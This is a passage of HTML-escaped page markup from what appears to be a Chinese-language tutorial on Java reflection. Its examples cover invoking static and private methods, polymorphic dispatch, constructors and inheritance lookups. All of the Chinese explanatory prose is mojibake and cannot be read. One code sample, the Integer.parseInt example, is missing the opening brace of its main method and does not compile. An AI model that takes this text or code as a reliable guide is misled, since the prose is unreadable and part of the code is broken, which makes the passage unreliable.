&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œ&lt;code>substring&lt;/code>è‡ªèº«æœ‰ä¸¤ä¸ªé‡è½½æ–¹æ³•ï¼Œæˆ‘ä»¬è·å–çš„æ˜¯å…¶ä¸­çš„&lt;code>substring(int)&lt;/code>è¿™ä¸ªæ–¹æ³•&lt;/p>
&lt;ul>
&lt;li>å¦‚æœè·å–åˆ°çš„Methodè¡¨ç¤ºä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œè°ƒç”¨é™æ€æ–¹æ³•æ—¶ï¼Œç”±äºæ— éœ€æŒ‡å®šå®ä¾‹å¯¹è±¡ï¼Œæ‰€ä»¥&lt;code>invoke&lt;/code>æ–¹æ³•ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°æ°¸è¿œä¸º&lt;code>null&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;parseInt&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è·å–Integer.parseInt(String)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;12345&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è°ƒç”¨
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>åŒä¸Šä¸€ä¸ªä¸‰çº§æ ‡é¢˜å¯¹äºprivateå­—æ®µçš„å¤„ç†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨&lt;code>Method.setAccessible(true)&lt;/code>ï¼Œä¹Ÿå­˜åœ¨åŒæ ·å¯èƒ½å¤±è´¥çš„åŸå› ï¼Œä¸é‡å¤äº†&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;setName&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Bob&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å¯¹äºå‚æ•°ä¸åŒçš„æ–¹æ³• æˆ‘ä»¬å¯ä»¥æŒ‡å®šå‚æ•°ç±»å‹å’Œæ•°é‡ï¼Œè€Œå¯¹äºå¤šæ€ï¼Œä»è¡¨ç°å‡ºå¤šæ€çš„åŸåˆ™ï¼Œå³ æ€»æ˜¯è°ƒç”¨å®é™…ç±»å‹çš„è¦†å†™æ–¹æ³•ï¼ˆå¦‚æœå­˜åœ¨&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">h&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">h&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/** ç›¸å½“äº
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Person p = new Student();
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> p.hello(); */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Person:hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// ç»§æ‰¿è‡ªPerson è¦†å†™helloæ–¹æ³•
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Student:hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="è°ƒç”¨æ„é€ æ–¹æ³•">è°ƒç”¨æ„é€ æ–¹æ³•&lt;/h3>
&lt;ul>
&lt;li>æ­£å¸¸çš„newä¼šè§¦å‘æ„é€ æ–¹æ³•ï¼Œé€šè¿‡classçš„newä¼šæœ‰å±€é™æ€§ï¼ˆè§ä¸Šï¼‰ï¼Œä¸ºäº†è°ƒç”¨ä»»æ„çš„æ„é€ æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åå°„çš„Constructorå¯¹è±¡ï¼Œå®ƒåŒ…å«ä¸€ä¸ªæ„é€ æ–¹æ³•çš„æ‰€æœ‰ä¿¡æ¯ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼›Constructorå¯¹è±¡å’ŒMethodéå¸¸ç±»ä¼¼ï¼Œä¸åŒä¹‹å¤„ä»…åœ¨äºå®ƒæ˜¯ä¸€ä¸ªæ„é€ æ–¹æ³•ï¼Œå¹¶ä¸”ï¼Œè°ƒç”¨ç»“æœæ€»æ˜¯è¿”å›å®ä¾‹&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Constructor&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è·å–æŸä¸ªpublicçš„Constructor
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">cons1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è·å–æ„é€ æ–¹æ³•Integer(int)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">cons1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">123&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è°ƒç”¨æ„é€ æ–¹æ³•
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">cons2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è·å–æ„é€ æ–¹æ³•Integer(String)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">cons2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;456&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>æ³¨æ„&lt;code>Constructor&lt;/code>æ€»æ˜¯å½“å‰ç±»å®šä¹‰çš„æ„é€ æ–¹æ³•ï¼Œå’Œçˆ¶ç±»æ— å…³ï¼Œå› æ­¤ä¸å­˜åœ¨å¤šæ€çš„é—®é¢˜&lt;/li>
&lt;li>åŒä¸Šé¢ï¼Œå¯ä»¥æœ‰&lt;code>setAccessible(true)&lt;/code>æ¥è°ƒç”¨épublicçš„Constructor&lt;/li>
&lt;/ul>
&lt;h3 id="è·å–ç»§æ‰¿å…³ç³»">è·å–ç»§æ‰¿å…³ç³»&lt;/h3>
&lt;ul>
&lt;li>æœ€å¼€å§‹çš„ä¸‰çº§æ ‡é¢˜Classä¸­æåˆ°äº†ä¸‰ç§æ–¹å¼è·å–Classå®ä¾‹ï¼Œä»–ä»¬éƒ½æ˜¯åŒä¸€ä¸ªå®ä¾‹ï¼Œå› ä¸ºJVMå¯¹æ¯ä¸ªåŠ è½½çš„&lt;code>Class&lt;/code>åªåˆ›å»ºä¸€ä¸ª&lt;code>Class&lt;/code>å®ä¾‹æ¥è¡¨ç¤ºå®ƒçš„ç±»å‹&lt;/li>
&lt;li>è·å–çˆ¶ç±»Class&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSuperclass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSuperclass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSuperclass&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>è·å–æ¥å£ï¼Œ&lt;code>getInterfaces&lt;/code>åªè¿”å›å½“å‰ç±»ç›´æ¥å®ç°çš„æ¥å£ç±»å‹ï¼Œä¸åŒ…æ‹¬çˆ¶ç±»ï¼›å¦‚æœä¸€ä¸ªç±»æ²¡æœ‰å®ç°ä»»ä½•&lt;code>interface&lt;/code>ï¼Œé‚£ä¹ˆ&lt;code>getInterfaces&lt;/code>è¿”å›ç©ºæ•°ç»„&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
